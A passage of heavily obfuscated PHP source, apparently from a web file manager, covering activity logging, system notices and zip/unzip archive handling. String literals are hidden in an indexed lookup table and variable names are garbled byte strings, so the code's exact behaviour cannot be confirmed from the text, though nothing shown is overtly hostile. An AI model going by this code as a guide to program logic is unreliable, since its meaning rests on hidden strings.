LNG($º…ğªøç[2193]), $º…ğªøç[2194] => LNG($º…ğªøç[2195]), $º…ğªøç[1815] => LNG($º…ğªøç[2196]), $º…ğªøç[1816] => LNG($º…ğªøç[2197]), $º…ğªøç[2198] => LNG($º…ğªøç[2199]), $º…ğªøç[2200] => LNG($º…ğªøç[2201]), $º…ğªøç[2202] => LNG($º…ğªøç[2203]), $º…ğªøç[1810] => LNG($º…ğªøç[2204]), $º…ğªøç[2205] => LNG($º…ğªøç[2206]), $º…ğªøç[1809] => LNG($º…ğªøç[2207]), $º…ğªøç[2208] => LNG($º…ğªøç[2209]), $º…ğªøç[2210] => LNG($º…ğªøç[2211]), $º…ğªøç[2212] => LNG($º…ğªøç[2213]), $º…ğªøç[2214] => LNG($º…ğªøç[2214]), $º…ğªøç[2215] => LNG($º…ğªøç[1781]), $º…ğªøç[2216] => LNG($º…ğªøç[2217]), $º…ğªøç[2218] => LNG($º…ğªøç[2219]), $º…ğªøç[2220] => LNG($º…ğªøç[2221]), $º…ğªøç[2222] => LNG($º…ğªøç[2223]), $º…ğªøç[2224] => LNG($º…ğªøç[2225]), $º…ğªøç[2226] => LNG($º…ğªøç[2226]), $º…ğªøç[2227] => LNG($º…ğªøç[2228]), $º…ğªøç[2229] => LNG($º…ğªøç[2230]), $º…ğªøç[2231] => LNG($º…ğªøç[2232]), $º…ğªøç[2233] => LNG($º…ğªøç[2234]), $º…ğªøç[2235] => LNG($º…ğªøç[2236]), $º…ğªøç[2237] => LNG($º…ğªøç[2238])); } private function typeFile() { $ßÉì…Ñ‘ =& $_SERVER[ÏéâËõ‘]; $›ÓÂùÀè = array($ßÉì…Ñ‘[1812] => array($ßÉì…Ñ‘[1813]), $ßÉì…Ñ‘[2180] => array($ßÉì…Ñ‘[2239]), $ßÉì…Ñ‘[2182] => array($ßÉì…Ñ‘[2240]), $ßÉì…Ñ‘[1805] => array($ßÉì…Ñ‘[1806]), $ßÉì…Ñ‘[2190] => array(), $ßÉì…Ñ‘[2192] => array(), $ßÉì…Ñ‘[2194] => array(), $ßÉì…Ñ‘[1815] => array($ßÉì…Ñ‘[1817]), $ßÉì…Ñ‘[1816] => array($ßÉì…Ñ‘[1817]), $ßÉì…Ñ‘[2198] => array($ßÉì…Ñ‘[2241]), $ßÉì…Ñ‘[2200] => array($ßÉì…Ñ‘[2241]), $ßÉì…Ñ‘[2202] => array($ßÉì…Ñ‘[2242]), $ßÉì…Ñ‘[2188] => array($ßÉì…Ñ‘[2243]), $ßÉì…Ñ‘[1810] => array($ßÉì…Ñ‘[2244]), $ßÉì…Ñ‘[2205] => array($ßÉì…Ñ‘[2245]), $ßÉì…Ñ‘[1809] => array($ßÉì…Ñ‘[1811])); return $›ÓÂùÀè; } private function typeAll() { $òğÎÊ§ò =& $_SERVER[ÏéâËõ‘]; $ÉÁ„ÒŸŠ = $this->typeList; $ì×·°È = array_filter($this->typeFile()); foreach ($ì×·°È as $ Ëòè·Ï => $«Ø×Ç¯ı) { $ÉÁ„ÒŸŠ[$«Ø×Ç¯ı[0]] = $ÉÁ„ÒŸŠ[$ Ëòè·Ï]; } $ÉÁ„ÒŸŠ[$òğÎÊ§ò[1817]] = LNG($òğÎÊ§ò[2246]); $ÉÁ„ÒŸŠ[$òğÎÊ§ò[2241]] = LNG($òğÎÊ§ò[2247]); return $ÉÁ„ÒŸŠ; } public function addLog($ à‹ì—£, $ëæ½ ‚ = array()) { $äËÁÌñ² =& $_SERVER[ÏéâËõ‘]; if (!isset($this->typeList[$ à‹ì—£])) { return; } $ÍèÊó¾ç = defined($äËÁÌñ²[475]) && USER_ID ? USER_ID : (isset($ëæ½ ‚[$äËÁÌñ²[1662]]) ? $ëæ½ ‚[$äËÁÌñ²[1662]] : 0); if (!$ÍèÊó¾ç) { $ÍèÊó¾ç = (int) Session::get($äËÁÌñ²[1971]); } if ($ à‹ì—£ == $äËÁÌñ²[2216] && is_array($ëæ½ ‚[$äËÁÌñ²[2248]]) && !$ëæ½ ‚[$äËÁÌñ²[2248]]) { return; } $–¤Şäßß = get_client_ip(); if (!$ëæ½ ‚ || strlen(json_encode($ëæ½ ‚)) >= 1024) { $ëæ½ ‚ = array($äËÁÌñ²[2249] => $–¤Şäßß); } else { if (is_array($ëæ½ ‚)) { $ëæ½ ‚[$äËÁÌñ²[2249]] = $–¤Şäßß; } else { $ëæ½ ‚ = array($äËÁÌñ²[1198] => $ëæ½ ‚, $äËÁÌñ²[2249] => $–¤Şäßß); } } $ëæ½ ‚ = array($äËÁÌñ²[1652] => Session::sign(), $äËÁÌñ²[1653] => $ÍèÊó¾ç, $äËÁÌñ²[33] => $ à‹ì—£, $äËÁÌñ²[1655] => json_encode($ëæ½ ‚)); parent::add($ëæ½ ‚); } public function remove($ïÈº’ªÊ) { $this->where(array($_SERVER[ÏéâËõ‘][419] => $ïÈº’ªÊ))->delete(); } private function _makeOrder($…õÚ¶öó = '') { $Ü¥··È¡ =& $_SERVER[ÏéâËõ‘]; $ÔƒÄú²‘ = $Ü¥··È¡[200]; $²œú¦® = array($Ü¥··È¡[450] => $Ü¥··È¡[451], $Ü¥··È¡[452] => $Ü¥··È¡[453]); $£¨Äó„ô = Input::get($Ü¥··È¡[458], $Ü¥··È¡[7], $Ü¥··È¡[2003], array($Ü¥··È¡[1925], $Ü¥··È¡[452])); $£¨Äó„ô = $²œú¦®[$£¨Äó„ô]; $…õÚ¶öó = $…õÚ¶öó . "{$ÔƒÄú²‘}\x20{$£¨Äó„ô}"; return $this->order($…õÚ¶öó); } public function get($Òñ ìÈ† = '') { $¡¨û€»å =& $_SERVER[ÏéâËõ‘]; if (!$Òñ ìÈ†) { show_json(array()); } $Õ¡œ»”æ = array(); if ($Òñ ìÈ†[$¡¨û€»å[1662]]) { $Õ¡œ»”æ[$¡¨û€»å[1662]] = $Òñ ìÈ†[$¡¨û€»å[1662]]; } if (isset($Òñ ìÈ†[$¡¨û€»å[763]])) { $ŸÛ©È„± = $Òñ ìÈ†[$¡¨û€»å[763]]; $¯ò‚»ÀÓ = isset($Òñ ìÈ†[$¡¨û€»å[497]]) ? $Òñ ìÈ†[$¡¨û€»å[497]] : time(); $Õ¡œ»”æ[$¡¨û€»å[200]] = array($¡¨û€»å[333], array($ŸÛ©È„±, $¯ò‚»ÀÓ)); } if ($Òñ ìÈ†[$¡¨û€»å[33]]) { $Ì‚ô ¸· = explode($¡¨û€»å[50], $Òñ ìÈ†[$¡¨û€»å[33]]); $»à”˜Ö™ = $this->typeFile(); $¸©¨÷¯Ì = array(); foreach ($Ì‚ô ¸· as $Ì­ª´°•) { $¸©¨÷¯Ì[] = $Ì­ª´°•; if (isset($»à”˜Ö™[$Ì­ª´°•])) { $¸©¨÷¯Ì = array_merge($¸©¨÷¯Ì, $»à”˜Ö™[$Ì­ª´°•]); } } $¸©¨÷¯Ì = array_unique($¸©¨÷¯Ì); if ($¸©¨÷¯Ì) { $Õ¡œ»”æ[$¡¨û€»å[33]] = array($¡¨û€»å[7], $¸©¨÷¯Ì); } } else { $Õ¡œ»”æ[$¡¨û€»å[33]] = array($¡¨û€»å[2250], $¡¨û€»å[2251]); } if (!empty($Òñ ìÈ†[$¡¨û€»å[2249]])) { $Õ¡œ»”æ[$¡¨û€»å[453]] = array($¡¨û€»å[383], "\x25{$Òñ ìÈ†[$¡¨û€»å[2249]]}\x25"); } $Ğ‰ìù¬© = $this->_makeOrder()->where($Õ¡œ»”æ)->selectPage(); if (empty($Ğ‰ìù¬©[$¡¨û€»å[369]])) { show_json(array(), !0, $Ğ‰ìù¬©[$¡¨û€»å[366]]); } $Ğ‰ìù¬©[$¡¨û€»å[369]] = $this->logList($Ğ‰ìù¬©[$¡¨û€»å[369]]); return $Ğ‰ìù¬©; } private function ipAddress(&$Ÿ•ùö³ö) { $èüâÒŠñ =& $_SERVER[ÏéâËõ‘]; if (!empty($Ÿ•ùö³ö[$èüâÒŠñ[2249]])) { $´ä­öèã = IpLocation::get($Ÿ•ùö³ö[$èüâÒŠñ[2249]]); } else { $´ä­öèã = LNG($èüâÒŠñ[2252]); } $Ÿ•ùö³ö[$èüâÒŠñ[2253]] = $´ä­öèã; } private function descZipDownload($èµÍ¸‚†, &$¬Šæ¨À½) { $’‰Ò´…Õ =& $_SERVER[ÏéâËõ‘]; if (!isset($èµÍ¸‚†[$’‰Ò´…Õ[2254]])) { return; } $úÜæöÇ¶ = json_decode($èµÍ¸‚†[$’‰Ò´…Õ[2254]], !0); foreach ($úÜæöÇ¶ as $Ùˆ‹âØ¥) { try { $—”é»ñá = IO::infoFull($Ùˆ‹âØ¥[$’‰Ò´…Õ[84]]); } catch (Exception $¿‡ÚÎ×—) { continue; } $èµÍ¸‚†[$’‰Ò´…Õ[84]] = $Ùˆ‹âØ¥[$’‰Ò´…Õ[84]]; $¬Šæ¨À½[] = $èµÍ¸‚†[$’‰Ò´…Õ[402]] = $—”é»ñá[$’‰Ò´…Õ[402]]; $¬Šæ¨À½[] = $èµÍ¸‚†[$’‰Ò´…Õ[2057]] = $—”é»ñá[$’‰Ò´…Õ[432]]; break; } return $èµÍ¸‚†; } private function getSourceList(&$”·äóØè) { $¹ËóŞ‰£ =& $_SERVER[ÏéâËõ‘]; $Ğ•…½è = array(); foreach ($”·äóØè as $ƒÕ‹¨¹Ì => $‚Õ˜Ù˜×) { $„’Ôµ€µ = json_decode($‚Õ˜Ù˜×[$¹ËóŞ‰£[453]], !0); if ($‚Õ˜Ù˜×[$¹ËóŞ‰£[33]] == $¹ËóŞ‰£[1808]) { $„’Ôµ€µ = $this->descZipDownload($„’Ôµ€µ, $Ğ•…½è); $”·äóØè[$ƒÕ‹¨¹Ì][$¹ËóŞ‰£[453]] = json_encode($„’Ôµ€µ); continue; } if (strpos($‚Õ˜Ù˜×[$¹ËóŞ‰£[33]], $¹ËóŞ‰£[2059]) !== 0) { if (!isset($„’Ôµ€µ[$¹ËóŞ‰£[84]]) || strpos($‚Õ˜Ù˜×[$¹ËóŞ‰£[33]], $¹ËóŞ‰£[2255]) !== 0) { continue; } try { $€ùŸøºö = IO::infoFull($„’Ôµ€µ[$¹ËóŞ‰£[84]]); } catch (Exception $¸Ä»´ø) { continue; } $Ğ•…½è[] = $„’Ôµ€µ[$¹ËóŞ‰£[402]] = $€ùŸøºö[$¹ËóŞ‰£[402]]; $Ğ•…½è[] = $„’Ôµ€µ[$¹ËóŞ‰£[2057]] = $€ùŸøºö[$¹ËóŞ‰£[432]]; $”·äóØè[$ƒÕ‹¨¹Ì][$¹ËóŞ‰£[453]] = json_encode($„’Ôµ€µ); continue; } $Ğ•…½è[] = $„’Ôµ€µ[$¹ËóŞ‰£[402]]; $Ğ•…½è[] = $„’Ôµ€µ[$¹ËóŞ‰£[2057]]; if ($„’Ôµ€µ[$¹ËóŞ‰£[33]] == $¹ËóŞ‰£[557]) { $Ğ•…½è[] = $„’Ôµ€µ[$¹ËóŞ‰£[453]][$¹ËóŞ‰£[1165]]; $Ğ•…½è[] = $„’Ôµ€µ[$¹ËóŞ‰£[453]][$¹ËóŞ‰£[1166]]; } if ($„’Ôµ€µ[$¹ËóŞ‰£[33]] == $¹ËóŞ‰£[2067]) { $Ğ•…½è[] = $„’Ôµ€µ[$¹ËóŞ‰£[453]][$¹ËóŞ‰£[402]]; } } if (!$Ğ•…½è) { return array(); } return Model($¹ËóŞ‰£[827])->sourceListInfo($Ğ•…½è, !0); } private function logList($¦£ÅÎ«§) { $²€²ğÎ =& $_SERVER[ÏéâËõ‘]; $ÈÓøË× = array_to_keyvalue($¦£ÅÎ«§, $²€²ğÎ[12], $²€²ğÎ[1662]); $¶áÃßÇ = Model($²€²ğÎ[535])->userListInfo(array_unique($ÈÓøË×)); $ğ¼†æáø = $this->getSourceList($¦£ÅÎ«§); $ö˜ë—› = $this->typeAll(); $Öš¨ºÎ¯ = array(); $Éó‡³îº = array(); foreach ($¦£ÅÎ«§ as $¸ÚëÎ¾­ => $‡ÓÜè—ı) { $÷á‚îèù = $‡ÓÜè—ı[$²€²ğÎ[33]]; $õÇ…âŠÄ = isset($¶áÃßÇ[$‡ÓÜè—ı[$²€²ğÎ[1662]]]) ? $¶áÃßÇ[$‡ÓÜè—ı[$²€²ğÎ[1662]]] : !1; $¾¯Íœ»ú = strpos($÷á‚îèù, $²€²ğÎ[2256]) === 0 ? LNG($²€²ğÎ[2257]) : LNG($²€²ğÎ[2252]); $‡ÓÜè—ı[$²€²ğÎ[32]] = isset($õÇ…âŠÄ[$²€²ğÎ[32]]) ? $õÇ…âŠÄ[$²€²ğÎ[32]] : LNG($²€²ğÎ[2252]); $‡ÓÜè—ı[$²€²ğÎ[542]] = isset($õÇ…âŠÄ[$²€²ğÎ[542]]) ? $õÇ…âŠÄ[$²€²ğÎ[542]] : $²€²ğÎ[12]; $‡ÓÜè—ı[$²€²ğÎ[1561]] = isset($ö˜ë—›[$÷á‚îèù]) ? $ö˜ë—›[$÷á‚îèù] : $¾¯Íœ»ú; $‡ÓÜè—ı[$²€²ğÎ[2002]] = $õÇ…âŠÄ; $¯ğµ’õ¤ = json_decode($‡ÓÜè—ı[$²€²ğÎ[453]], !0); $‡ÓÜè—ı[$²€²ğÎ[2249]] = isset($¯ğµ’õ¤[$²€²ğÎ[2249]]) ? $¯ğµ’õ¤[$²€²ğÎ[2249]] : $²€²ğÎ[12]; $‡ÓÜè—ı[$²€²ğÎ[2253]] = IpLocation::get($‡ÓÜè—ı[$²€²ğÎ[2249]]); if (strpos($÷á‚îèù, $²€²ğÎ[2059]) === 0 || isset($¯ğµ’õ¤[$²€²ğÎ[2057]])) { $¯ğµ’õ¤[$²€²ğÎ[86]] = $ğ¼†æáø[$¯ğµ’õ¤[$²€²ğÎ[402]]]; $¯ğµ’õ¤[$²€²ğÎ[2072]] = $ğ¼†æáø[$¯ğµ’õ¤[$²€²ğÎ[2057]]]; if ($¯ğµ’õ¤[$²€²ğÎ[33]] == $²€²ğÎ[557]) { $¯ğµ’õ¤[$²€²ğÎ[453]][$²€²ğÎ[1165]] = $ğ¼†æáø[$¯ğµ’õ¤[$²€²ğÎ[453]][$²€²ğÎ[1165]]]; $¯ğµ’õ¤[$²€²ğÎ[453]][$²€²ğÎ[1166]] = $ğ¼†æáø[$¯ğµ’õ¤[$²€²ğÎ[453]][$²€²ğÎ[1166]]]; } if ($¯ğµ’õ¤[$²€²ğÎ[33]] == $²€²ğÎ[2067]) { $¯ğµ’õ¤[$²€²ğÎ[453]][$²€²ğÎ[402]] = $ğ¼†æáø[$¯ğµ’õ¤[$²€²ğÎ[453]][$²€²ğÎ[402]]]; } if ($¯ğµ’õ¤[$²€²ğÎ[33]] == $²€²ğÎ[1803]) { $¯ğµ’õ¤[$²€²ğÎ[2072]] = $¯ğµ’õ¤[$²€²ğÎ[86]]; $¯ğµ’õ¤[$²€²ğÎ[2057]] = $¯ğµ’õ¤[$²€²ğÎ[2072]][$²€²ğÎ[402]]; $¯ğµ’õ¤[$²€²ğÎ[86]] = !1; $¯ğµ’õ¤[$²€²ğÎ[402]] = $²€²ğÎ[12]; } if ($¯ğµ’õ¤[$²€²ğÎ[86]] && $¯ğµ’õ¤[$²€²ğÎ[86]][$²€²ğÎ[411]] == $²€²ğÎ[1281]) { $Éó‡³îº[] = $‡ÓÜè—ı[$²€²ğÎ[399]]; unset($¦£ÅÎ«§[$¸ÚëÎ¾­]); continue; } if ($¯ğµ’õ¤[$²€²ğÎ[2072]] && $¯ğµ’õ¤[$²€²ğÎ[2072]][$²€²ğÎ[411]] == $²€²ğÎ[1281]) { $Éó‡³îº[] = $‡ÓÜè—ı[$²€²ğÎ[399]]; unset($¦£ÅÎ«§[$¸ÚëÎ¾­]); continue; } } $‡ÓÜè—ı[$²€²ğÎ[453]] = $¯ğµ’õ¤; unset($‡ÓÜè—ı[$²€²ğÎ[2258]]); $Öš¨ºÎ¯[] = $‡ÓÜè—ı; } $this->clearSystemPathLog($Éó‡³îº); return $Öš¨ºÎ¯; } private function clearSystemPathLog($‰¨›á³Æ) { $üÍïˆ‰¾ =& $_SERVER[ÏéâËõ‘]; if (count($‰¨›á³Æ) == 0) { return; } $÷»©éˆ… = array($üÍïˆ‰¾[399] => array($üÍïˆ‰¾[7], array_unique($‰¨›á³Æ))); $this->where($÷»©éˆ…)->delete(); } public function deviceList($¶«÷Ë”‰, $›Îä‘ = 0) { $°‚«Šşñ =& $_SERVER[ÏéâËõ‘]; $Ïš¦Á = array($°‚«Šşñ[1662] => $¶«÷Ë”‰, $°‚«Šşñ[200] => array($°‚«Šşñ[1019], $›Îä‘), $°‚«Šşñ[33] => $°‚«Šşñ[1777]); $ùŠ÷óÉä = array(); $ÙÇŠ²’ = $this->field($°‚«Šşñ[2259])->where($Ïš¦Á)->order($°‚«Šşñ[2070])->limit(50)->select(); foreach ($ÙÇŠ²’ as $‘ëò®É£ => $¦ û‰æ†) { if ($‘ëò®É£ > 0 && abs($¦ û‰æ†[$°‚«Šşñ[200]] - $ÙÇŠ²’[$‘ëò®É£ - 1][$°‚«Šşñ[200]]) < 5) { continue; } $ÄŸãš = json_decode($¦ û‰æ†[$°‚«Šşñ[453]], !0); $¦ û‰æ†[$°‚«Šşñ[2249]] = isset($ÄŸãš[$°‚«Šşñ[2249]]) ? $ÄŸãš[$°‚«Šşñ[2249]] : $°‚«Šşñ[12]; unset($ÄŸãš[$°‚«Šşñ[2249]]); $éˆ§÷Ÿù = $this->deviceType($ÄŸãš[$°‚«Šşñ[2060]]); if (isset($ùŠ÷óÉä[$éˆ§÷Ÿù])) { continue; } $¦ û‰æ†[$°‚«Šşñ[2253]] = IpLocation::get($¦ û‰æ†[$°‚«Šşñ[2249]]); $¦ û‰æ†[$°‚«Šşñ[453]] = $ÄŸãš; $ùŠ÷óÉä[$éˆ§÷Ÿù] = $¦ û‰æ†; } return array_values($ùŠ÷óÉä); } public function deviceType($”‘ñî¦Ä) { return $”‘ñî¦Ä; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\145\155\56\x6e\x6f\x74\151\143\x65\114\x69\163\x74"; public $field = array("\x6e\141\155\145", "\143\157\x6e\164\145\x6e\164", "\x61\x75\x74\x68", "\155\157\144\x65", "\164\x69\155\x65", "\x74\171\x70\x65", "\x6c\145\166\145\x6c", "\x65\156\x61\x62\x6c\x65", "\x73\157\162\x74"); public function listData($º’Š²Óİ = false, $ƒä¤˜Ç = "\x73\x6f\x72\164", $«ÃŸÂ¯ñ = false) { return parent::listData($º’Š²Óİ, $ƒä¤˜Ç, $«ÃŸÂ¯ñ); } public function add($®‚¤„‰í) { $ïÇªıûİ =& $_SERVER[ÏéâËõ‘]; $‡ÆÇªâª = time(); if ($®‚¤„‰í[$ïÇªıûİ[16]] == $ïÇªıûİ[2260]) { $‡ÆÇªâª = strtotime($®‚¤„‰í[$ïÇªıûİ[203]]); } $®‚¤„‰í[$ïÇªıûİ[203]] = $‡ÆÇªâª; return parent::insert($®‚¤„‰í); } public function update($úçÜÛê², $Ùªû†É) { $™Ï“Ñœã =& $_SERVER[ÏéâËõ‘]; $¬¦İİ = $this->listData($úçÜÛê²); if (!$¬¦İİ) { return !1; } $Î„Äí¸  = time(); if ($Ùªû†É[$™Ï“Ñœã[16]] == $™Ï“Ñœã[2260]) { $Î„Äí¸  = strtotime($Ùªû†É[$™Ï“Ñœã[203]]); } $Ùªû†É[$™Ï“Ñœã[203]] = $Î„Äí¸ ; return parent::update($úçÜÛê², $Ùªû†É); } public function remove($ Ğ¢ÖÎƒ) { $¾Ï¤©ãß = $this->listData($ Ğ¢ÖÎƒ); if (!$¾Ï¤©ãß || $¾Ï¤©ãß[$_SERVER[ÏéâËõ‘][1281]]) { return !1; } return parent::remove($ Ğ¢ÖÎƒ); } public function sort($é¦—µÁ, $È’ò¼¾ù) { return parent::update($é¦—µÁ, $È’ò¼¾ù); } public function enable($ĞŠº, $¾Ù˜êö) { return parent::update($ĞŠº, array($_SERVER[ÏéâËõ‘][2261] => $¾Ù˜êö)); } private function initUserOption() { $½ìºº·° =& $_SERVER[ÏéâËõ‘]; $this->optionType = $½ìºº·°[2262]; $this->modelType = $½ìºº·°[2263]; $this->field = array($½ìºº·°[2264], $½ìºº·°[32], $½ìºº·°[203], $½ìºº·°[33], $½ìºº·°[2265], $½ìºº·°[752], $½ìºº·°[195]); } public function userNoticeGet($œäóâš¨ = false) { $this->initUserOption(); return parent::listData($œäóâš¨, $_SERVER[ÏéâËõ‘][399], !0); } public function userNoticeAdd($ÑİßÀ³…) { $‹ÓÜû–Ï =& $_SERVER[ÏéâËõ‘]; $this->initUserOption(); $¦Äª¹Œˆ = $this->findByKey($‹ÓÜû–Ï[2264], $ÑİßÀ³…[$‹ÓÜû–Ï[399]]); if ($¦Äª¹Œˆ) { return !0; } $Æø°Š˜Í = array($‹ÓÜû–Ï[2264] => $ÑİßÀ³…[$‹ÓÜû–Ï[399]], $‹ÓÜû–Ï[32] => $ÑİßÀ³…[$‹ÓÜû–Ï[32]], $‹ÓÜû–Ï[203] => $ÑİßÀ³…[$‹ÓÜû–Ï[203]], $‹ÓÜû–Ï[33] => isset($ÑİßÀ³…[$‹ÓÜû–Ï[33]]) ? $ÑİßÀ³…[$‹ÓÜû–Ï[33]] : 1, $‹ÓÜû–Ï[2265] => isset($ÑİßÀ³…[$‹ÓÜû–Ï[2265]]) ? $ÑİßÀ³…[$‹ÓÜû–Ï[2265]] : 0, $‹ÓÜû–Ï[752] => 0, $‹ÓÜû–Ï[195] => 0); return parent::insert($Æø°Š˜Í); } public function userNoticeEdit($ğö±ª’ï, $ ºÒø‘¾) { $this->initUserOption(); return parent::update($ğö±ª’ï, $ ºÒø‘¾); } } goto c­ˆÓËÚİ¹; D´º¦Šç§: class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $¾Ü•¹Êˆ; if (!$¾Ü•¹Êˆ) { $—éø‘Ù» = IO::init($_SERVER[ÏéâËõ‘][8]); } return $—éø‘Ù»; } private static function iconvSystem($î×àéš) { return self::local()->iconvSystem($î×àéš); } private static function iconvApp($¸«›¦â) { return self::local()->iconvApp($¸«›¦â); } public static function zip($¡ºİäšø, $Ø™˜¥ = "\172\x69\160", $óÁ¯Â¼ƒ = '', $¦» ¼ÉÁ = REPEAT_RENAME) { $“€Ïª• =& $_SERVER[ÏéâËõ‘]; $Áõ‰‹û¯ = self::init($¡ºİäšø[0][$“€Ïª•[84]]); $¨ğÇÎÚ = self::info($¡ºİäšø[0][$“€Ïª•[84]]); $ÚØ‹ôÌô = !1; if (!$óÁ¯Â¼ƒ && $Áõ‰‹û¯->getType() == $“€Ïª•[106]) { $Äà­©ë‰ = self::zipFileList($¡ºİäšø); } else { $ÚØ‹ôÌô = $óÁ¯Â¼ƒ ? $óÁ¯Â¼ƒ : TEMP_FILES . $“€Ïª•[1189] . time() . rand_string(8) . $“€Ïª•[8]; mk_dir($ÚØ‹ôÌô); $Äà­©ë‰ = self::zipFileList($¡ºİäšø, $ÚØ‹ôÌô); } $¾‰Æ™Ë¨ = $¨ğÇÎÚ[$“€Ïª•[32]]; if (count($Äà­©ë‰) > 1) { $ïâºİ­ = IO::info(IO::pathFather($¨ğÇÎÚ[$“€Ïª•[84]])); $¾‰Æ™Ë¨ = $ïâºİ­[$“€Ïª•[32]]; } $…õšÌ’Ä = $ÚØ‹ôÌô; if (!$…õšÌ’Ä) { $…õšÌ’Ä = get_path_father($¨ğÇÎÚ[$“€Ïª•[84]]); if (!$óÁ¯Â¼ƒ && $Áõ‰‹û¯->getType() == $“€Ïª•[106]) { $…õšÌ’Ä = get_path_father($Áõ‰‹û¯->path); } $ÃúŸ¾Æ = IO::info($…õšÌ’Ä); if (!$ÃúŸ¾Æ[$“€Ïª•[202]]) { show_json(LNG($“€Ïª•[1190]), !1); } } $œÏßİòÜ = $…õšÌ’Ä . $¾‰Æ™Ë¨ . $“€Ïª•[10] . $Ø™˜¥; $œÏßİòÜ = get_filename_auto($œÏßİòÜ, $“€Ïª•[12], $¦» ¼ÉÁ); $Ê«šé¡Á = self::iconvSystem($œÏßİòÜ); foreach ($Äà­©ë‰ as $»©Ã­ => $¹¦½¾¿) { $Äà­©ë‰[$»©Ã­] = self::iconvSystem($¹¦½¾¿); } KodArchive::create($Ê«šé¡Á, $Äà­©ë‰); if (!IO::exist($œÏßİòÜ)) { if ($ÚØ‹ôÌô) { del_dir($ÚØ‹ôÌô); } show_json(LNG($“€Ïª•[1191]), !1); } if ($óÁ¯Â¼ƒ || !$ÚØ‹ôÌô) { if ($ÚØ‹ôÌô && strstr($ÚØ‹ôÌô, TEMP_FILES)) { $œ‰€§¡ = $Äà­©ë‰ = array(); recursion_dir($…õšÌ’Ä, $œ‰€§¡, $Äà­©ë‰, 0); foreach ($œ‰€§¡ as $óÄŒ·¶…) { del_dir($óÄŒ·¶…); } foreach ($Äà­©ë‰ as $·ÌÚ±ôú) { if ($·ÌÚ±ôú == $Ê«šé¡Á) { continue; } del_file($·ÌÚ±ôú); } } return $œÏßİòÜ; } $š€ºØëó = self::pathFather($¨ğÇÎÚ[$“€Ïª•[84]]); $ïŒøè¢„ = self::move($œÏßİòÜ, $š€ºØëó, $¦» ¼ÉÁ); if (!$ïŒøè¢„) { del_dir($ÚØ‹ôÌô); show_json(LNG($“€Ïª•[1191]), !1); } del_dir($ÚØ‹ôÌô); return $ïŒøè¢„; } public static function unzip($Ÿ‰ÏğÈ‚, $Í™Í†Î­ = "\x72\145\160\154\141\x63\x65") { $ÑÑ­° ò =& $_SERVER[ÏéâËõ‘]; $º®…¾Æ“ = $Ÿ‰ÏğÈ‚[$ÑÑ­° ò[84]]; $¾ „ûÙŒ = $Ÿ‰ÏğÈ‚[$ÑÑ­° ò[1192]]; if (!($‡ÈäøÈ· = parent::info($º®…¾Æ“))) { show_json(LNG($ÑÑ­° ò[1193]), !1); } if (!($ºÒÈÍñã = parent::infoFull($¾ „ûÙŒ))) { $¾ „ûÙŒ = parent::mkdir($¾ „ûÙŒ); $ºÒÈÍñã = array($ÑÑ­° ò[84] => $¾ „ûÙŒ); } else { if (isset($ºÒÈÍñã[$ÑÑ­° ò[402]]) && trim($ºÒÈÍñã[$ÑÑ­° ò[84]], $ÑÑ­° ò[8]) != trim($¾ „ûÙŒ, $ÑÑ­° ò[8])) { $ó²¤Î¦± = KodIO::make($ºÒÈÍñã[$ÑÑ­° ò[432]]); $¿ƒü±ªï = parent::fileNameAuto($ó²¤Î¦±, $ºÒÈÍñã[$ÑÑ­° ò[32]], REPEAT_RENAME_FOLDER, !0); $¾ „ûÙŒ = parent::mkdir($ó²¤Î¦± . $¿ƒü±ªï); $ºÒÈÍñã = array($ÑÑ­° ò[84] => $¾ „ûÙŒ); } } $¾ „ûÙŒ = $ºÒÈÍñã[$ÑÑ­° ò[84]]; $°éÑëÀ¶ = self::tmpFileName($‡ÈäøÈ·); $’²¿Ğêã = TEMP_FILES . $°éÑëÀ¶; del_dir($’²¿Ğêã); mk_dir($’²¿Ğêã); $ŠÒö€¥ = self::fileExt($‡ÈäøÈ·); $¯‡˜§…ñ = $’²¿Ğêã . $ÑÑ­° ò[10] . $ŠÒö€¥; if (!@file_exists(self::iconvSystem($¯‡˜§…ñ))) { $”Ä éšˆ = self::localFilePath($º®…¾Æ“, $ŠÒö€¥); $¯‡˜§…ñ = $”Ä éšˆ ? $”Ä éšˆ : parent::download($º®…¾Æ“, $¯‡˜§…ñ); } $¯‡˜§…ñ = self::iconvSystem($¯‡˜§…ñ); $½ç²Æ• = isset($Ÿ‰ÏğÈ‚[$ÑÑ­° ò[1194]]) ? $Ÿ‰ÏğÈ‚[$ÑÑ­° ò[1194]] : $ÑÑ­° ò[1195]; $ÏÑêï½¤ = KodArchive::extract($¯‡˜§…ñ, $’²¿Ğêã . $ÑÑ­° ò[8], $½ç²Æ•); self::archiveExt(); if (!$ÏÑêï½¤[$ÑÑ­° ò[1196]]) { show_json($ÑÑ­° ò[1197] . $ÏÑêï½¤[$ÑÑ­° ò[1198]], !1); } Hook::trigger($ÑÑ­° ò[1199], $’²¿Ğêã); recursion_dir($’²¿Ğêã, $èë£ÊÚ, $Ÿ‚ùÉü, 0); $ßŞãº®˜ = array_merge($èë£ÊÚ, $Ÿ‚ùÉü); foreach ($ßŞãº®˜ as $±ÂÏ˜øÜ) { $±ÂÏ˜øÜ = self::iconvApp($±ÂÏ˜øÜ); self::move($±ÂÏ˜øÜ, $¾ „ûÙŒ, $Í™Í†Î­); } del_dir($’²¿Ğêã); if (!$”Ä éšˆ) { del_file($¯‡˜§…ñ); } return !0; } public static function unzipList($ü²½œÑÖ) { $º¹‡³îĞ =& $_SERVER[ÏéâËõ‘]; $ñÕó¥éÂ = $ü²½œÑÖ[$º¹‡³îĞ[84]]; $¿±ûšÑ¥ = isset($ü²½œÑÖ[$º¹‡³îĞ[1200]]) ? $ü²½œÑÖ[$º¹‡³îĞ[1200]] : -1; $Ùö©³æ§ = 50000; if (request_url_safe($ñÕó¥éÂ)) { $¶¾éİ·¶ = parse_url_query($ñÕó¥éÂ); if (!isset($¶¾éİ·¶[$º¹‡³îĞ[84]])) { show_json($º¹‡³îĞ[1201], !1); } } $á™î‘òè = isset($¶¾éİ·¶) ? $¶¾éİ·¶[$º¹‡³îĞ[84]] : $ñÕó¥éÂ; $œ¨ÚŒëÕ = self::info($á™î‘òè); $¯Èëœ¹ã = self::fileExt($œ¨ÚŒëÕ); $¸É·Ò®ñ = self::tmpFileName($œ¨ÚŒëÕ); if (isset($¶¾éİ·¶)) { $îº¢Ó€™ = array($¶¾éİ·¶[$º¹‡³îĞ[84]], $¶¾éİ·¶[$º¹‡³îĞ[1200]], $¶¾éİ·¶[$º¹‡³îĞ[32]]); 